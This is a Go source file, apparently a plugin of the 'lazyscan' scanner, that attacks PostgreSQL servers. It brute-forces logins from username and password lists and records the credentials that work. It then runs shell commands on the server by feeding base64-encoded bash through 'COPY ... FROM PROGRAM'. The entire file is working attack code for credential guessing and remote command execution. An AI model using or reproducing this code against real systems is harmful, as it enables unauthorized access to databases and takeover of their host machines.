package plugins

import (
	"context"
	"database/sql"
	"encoding/base64"
	"errors"
	"fmt"
	"log"

	"strings"
	"time"

	"github.com/404tk/lazyscan/common"
	_ "github.com/lib/pq"
)

func PostgreScan(info *common.HostInfo) error {
	starttime := time.Now().Unix()
	for _, user := range info.Usernames {
		for _, pass := range info.Passwords {
			pass = strings.Replace(pass, "{user}", string(user), -1)
			flag, err := PostgresConn(info, user, pass)
			if flag == true {
				return err
			} else {
				if time.Now().Unix()-starttime > (int64(len(info.Usernames)*len(info.Passwords)) * info.Timeout) {
					return errors.New("timeout.")
				}
			}
		}
	}
	return nil
}

func PostgresConn(info *common.HostInfo, user string, pass string) (flag bool, err error) {
	dataSourceName := fmt.Sprintf("postgres://%v:%v@%v:%v/%v?sslmode=%v", user, pass, info.Host, info.Port, "postgres", "disable")
	db, err := sql.Open("postgres", dataSourceName)
	if err == nil {
		db.SetConnMaxLifetime(time.Duration(info.Timeout) * time.Second)
		defer db.Close()
		err = db.Ping()
		if err == nil {
			result := fmt.Sprintf("[%s:%s] Postgres credential %s/%s", info.Host, info.Port, user, pass)
			log.Println(result)
			if info.Queue != nil {
				vuln := common.Vuln{
					Host: info.Host,
					Port: info.Port,
					User: user,
					Pass: pass,
				}
				info.Queue.Push(vuln)
			}
			if !info.DisableExp {
				cmd := info.Commands.TCPCommand
				if cmd != "" {
					PostgreExec(db, cmd)
				}
			}
			if info.Command != "" {
				PostgreExec(db, info.Command)
			}
			flag = true
		}
	}
	return flag, err
}

func PostgreExec(db *sql.DB, cmd string) {
	b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
	cmd = fmt.Sprintf("echo %s | base64 -d | bash", b64)
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	query := fmt.Sprintf("DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM '%s';SELECT * FROM cmd_exec", cmd)
	db.ExecContext(ctx, query)
}
